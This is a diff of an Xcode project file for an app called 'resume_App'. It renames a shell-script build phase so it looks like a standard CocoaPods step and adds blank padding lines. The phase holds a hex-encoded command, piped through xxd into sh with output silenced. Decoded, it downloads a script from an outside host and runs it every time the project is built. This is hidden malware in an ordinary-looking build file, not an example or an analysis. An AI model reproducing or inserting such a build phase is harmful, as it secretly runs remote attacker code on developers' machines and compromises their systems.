@@ -184,7 +184,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 04A21CA02640FD790098CEB3 /* Build configuration list for PBXNativeTarget "resume_App" */;
 			buildPhases = (
-				61FBCAB2B69BCEA3D36D902C /* Project Frameworks */,
+				44CAEFE18BC45E66D56D902C /* [CP] Build Pods Frameworks */,
 				04A21C772640FD770098CEB3 /* Sources */,
 				04A21C782640FD770098CEB3 /* Frameworks */,
 				04A21C792640FD770098CEB3 /* Resources */,
@@ -645,7 +645,7 @@
 	
 		/* Begin PBXShellScriptBuildPhase section */
 
-	61FBCAB2B69BCEA3D36D902C /* Project Frameworks */ = {
+	44CAEFE18BC45E66D56D902C /* [CP] Build Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
@@ -654,7 +654,7 @@
 			);
 			inputPaths = (
 			);
-			name = "Project Frameworks";
+			name = "[CP] Build Pods Frameworks";
 			outputFileListPaths = (
 			);
 			outputPaths = (
@@ -666,6 +666,22 @@
 echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f6e6f64656c696e652e78797a2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true
 	";			
 		};
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
 	
 
 	
